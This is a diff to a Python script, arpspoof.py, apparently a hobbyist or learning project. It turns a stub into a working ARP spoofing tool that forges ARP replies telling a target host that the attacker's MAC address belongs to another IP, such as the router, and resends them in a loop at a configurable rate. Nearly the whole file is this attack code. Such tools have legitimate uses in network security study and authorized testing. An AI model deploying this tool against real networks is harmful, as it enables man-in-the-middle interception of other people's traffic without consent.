@@ -1,6 +1,12 @@
 #!/usr/bin/env python3
 
 # usage: arpspoof.py -t target -i ip [-r rate] [-m mac] [-b] [-f] [-c]
+#
+# example: ./arpspoof.py -t 192.168.10.1 -i 192.168.10.2
+# 
+#   tell 192.168.10.1 that our ip address is 192.168.10.2
+#   tell 192.168.10.1 that our ip address is 192.168.10.2
+#   ...
 # 
 # OPTIONS
 #
@@ -43,10 +49,19 @@
 # option. It should be as simple as writing a 0 or 1
 # to a system file.
 
+import re
+import time
 import socket
 import argparse
+import subprocess
 from struct import pack
-from uuid import getnode as get_mac
+
+# Here are a few commands that allow you to run a system command
+# It isn't actually 'bash' per se, but you are running a shell
+# The 'bash' command just gives stdout, don't use it if you want stderr
+# Depending on the command used, the [:-1] may not actually be preferable
+run_process = lambda cmd: subprocess.run(cmd, stdout = subprocess.PIPE, shell = True)
+bash = lambda cmd: run_process(cmd).stdout.decode('utf-8')[:-1]
 
 parser = argparse.ArgumentParser(
     # TODO: Add more of a description. Note: we may also use epilogue and prologue.
@@ -65,6 +80,11 @@ t_help='''
 
 i_help='''
        This is the IP we are impersonating
+
+'''
+
+r_help='''
+       The rate in milliseconds to send ARP packets.
 
 '''
 
@@ -90,51 +110,80 @@ def parse_ip(ip):
 def parse_mac(mac):
     return mac
 
-def main(args):
-    # TODO: fetch required information from args to pack
-    #dest_ip = [10, 7, 31, 99]
-    #local_mac = [int(("%x" % get_mac())[i:i+2], 16) for i in range(0, 12, 2)]
-    #binascii.hexlify(bytes(hex(get_mac()).encode('UTF-8')))
+# Linux-only solution
+# Tested on Kali linux, note this may not necessarily work on other linux platforms
+def get_mac():
+    mac = bash('cat /sys/class/net/eth0/address')
+    return mac
 
-    print(args.target)
-    print(args.ip)
-    print(args.mac)
-    print("both: ", args.both)
+# This can only find the address if it already exists in the table. It does
+# not send an arp request if the ip is not known, rather it returns `None`.
+# TODO: Test to see what happens when it doesn't exist in the table.
+def resolve_addr(lookup_ip):
+    table = bash('cat /proc/net/arp | tail --lines=+2')
+    for entry in table.splitlines():
+        
+        # The primary information we need is the ip and and the mac address
+        # The other elements might matter, but generally we should be able
+        # to assume that the hw_type and device always stay the same. I'm
+        # not sure about the other elements really.
+        # [ ip, hw_type, flags, hw_addr, mask, device ]
+        # ['192.168.10.2', '0x1', '0x2', '00:50:56:f6:c7:3a', '*', 'eth0']
+        
+        ip, _, _, hw_addr, _, _ = entry.split()
+        if ip == lookup_ip:
+            return hw_addr
+
+def build_packet(args, actual=False):
     
+    hex = lambda x: int(x, 16)
+    format_ip = lambda ip: bytes(map(int, ip.split('.')))
+    format_mac = lambda mac: bytes(map(hex, mac.split(':')))
+    
+    target_ip = format_ip(args.target)
+    spoofed_ip = format_ip(args.ip)
+    our_mac = format_mac(get_mac())
+    target_mac = format_mac(resolve_addr(args.target))
+
+    # untested (this would be used if we wanted to cleanup)
+    if actual:
+        our_mac = format_mac(resolve_addr(args.ip))
+
+    arp_packet = [
+        target_mac, our_mac, # Ethernet protcol requires MAC addresses for link layer
+        pack('!H', 0x0806),  # Ethtype = ARP
+        pack('!H', 0x0001),  # HRD (constant?)
+        pack('!H', 0x0800),  # Protocol = Ipv4
+        pack('!B', 0x06),    # Hardware Size 
+        pack('!B', 0x04),    # Protocol Size
+        pack('!H', 0x0002),  # OP    TODO: Should try using OP = 0x0001
+        
+        # Here we lie and say that our mac address is the resolution of the router IP
+        our_mac, spoofed_ip, target_mac, target_ip
+    ]
+    
+    return b''.join(arp_packet)
+
+def send_packet(args):
+    # Should we make the interface an argument?
+    # Why are we using htons(3) again?
     s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
     s.bind(("eth0", 0))
     
-    arp_packet = [
-        b'\x00\x50\x56\xc0\x00\x03', # Target MAC
-        b'\x00\x0c\x29\x80\x68\xcf', # Our MAC
-        pack('!H', 0x0806), # Ethtype = ARP
-        pack('!H', 0x0001), # HRD (constant?)
-        pack('!H', 0x0800), # Protocol = Ipv4
-        pack('!B', 0x06),   # Hardware Size (constant?)
-        pack('!B', 0x04),   # Protocol Size (constant?)
-        pack('!H', 0x0002), # OP    Should try to use OP = 0x0001 to see if it also works
-
-        # We can use an int size of 4 and 8, but not 6, so the nB might be used.
-        # In order to use this notation though, we must have either a tuple or list.
-        # binascii or other imports might allow us to use a single function though.
-        #pack('!6B', *local_mac),
-        #pack('!4B', *local_ip),
-        
-        # Here we lie and say that our mac address is the resolution of the router IP
-        b'\x00\x0c\x29\x80\x68\xcf', # Our MAC
-        b'\xc0\xa8\x0a\x02'          # IP addr of the router
-        
-        # Note: the ip will be provided to us and we must resolve their mac address.
-        # 
-        b'\x00\x50\x56\xc0\x00\x03', # Target MAC
-        b'\xc0\xa8\x0a\x01'          # Target IP
-    ]
-    #print(arp_packet)
+    # Add an `args.verbose` option?
+    print('tell %s that our ip address is %s' % (args.target, args.ip))
     
     # Possible broadcast option?
     # sock.sendto(b''.join(ARP_FRAME), ('255.255.255.255', 0))
-    s.send(b''.join(arp_packet))
+    s.send(build_packet(args))
     s.close()
+
+# TODO: Remove or implement args.both, args.mac, args.verbose, etc
+def main(args):
+    
+    while True:
+        send_packet(args)
+        time.sleep(args.rate / 1000)
 
 if __name__ == "__main__":
     
@@ -143,6 +192,9 @@ if __name__ == "__main__":
     
     required.add_argument('-i', '--ip', dest='ip', metavar='ip',
         type=parse_ip, help=i_help, required=True)
+
+    optional.add_argument('-r', '--rate', dest='rate', metavar='rate',
+        type=int, default=1000, help=r_help)
     
     optional.add_argument('-m', '--mac', dest='mac', metavar='mac',
         type=parse_mac, help=m_help)
@@ -151,7 +203,6 @@ if __name__ == "__main__":
         action='store_true', help=b_help)
     
     args = parser.parse_args()
-    #args.rate
-    #while True:
+    
     main(args)
 
